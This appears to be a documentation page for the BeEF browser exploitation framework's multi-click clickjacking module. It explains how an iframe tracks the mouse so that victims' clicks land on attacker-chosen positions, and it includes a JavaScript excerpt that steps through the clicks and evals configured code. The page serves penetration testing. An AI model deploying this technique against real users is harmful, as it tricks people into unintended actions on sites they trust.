## Summary

* **Objective**: perform basic multi-click clickjacking
* **Authors**: Brigette Lundeen, Rich Lundeen
* **Browsers**: Firefox, Chrome, IE

* [Code](https://github.com/beefproject/beef/tree/master/modules/social_engineering/clickjacking)

## Internal Working

The iframe follows the mouse, so anywhere the user clicks on the page will be over x-pos,y-pos. The optional JS configuration values specify local Javascript to exectute when a user clicks, allowing the page can give visual feedback. The attack stops when y-pos is set to a non-numeric values (e.g. a dash). 

For a demo, visit `<beef root>/demos/clickjacking/clickjack_attack.html` with the default settings (based on browser they may have to be adjusted).


```js

        function iframeClicked(){
                clicked++;
                var jsfunc = '';
                jsfunc = clicks[clicked-1].js;
                innerPos.top = clicks[clicked].posTop;
                innerPos.left = clicks[clicked].posLeft;
                eval(unescape(jsfunc));
                setTimeout(function(){
                        updateIframePosition();
                }, <%= @clickDelay %>);

                setTimeout(function(){
                        var btnSelector = "#" + elems.btn;
                        var btnObj = $j(btnSelector);
                        $j(btnObj).focus();

                        //check if there are any more actions to perform
                        try {
                                if (isNaN(parseInt(clicks[clicked].posTop))) {
                                        removeAll(elems);
                                        throw "No more clicks.";
                                }
                        } catch(e) {
                                cjLog(e);
                        }
                }, 200);
        }
```

## References

https://en.wikipedia.org/wiki/Clickjacking

## Screenshots

[[Images/module-clickjacking1.png|align=center]]





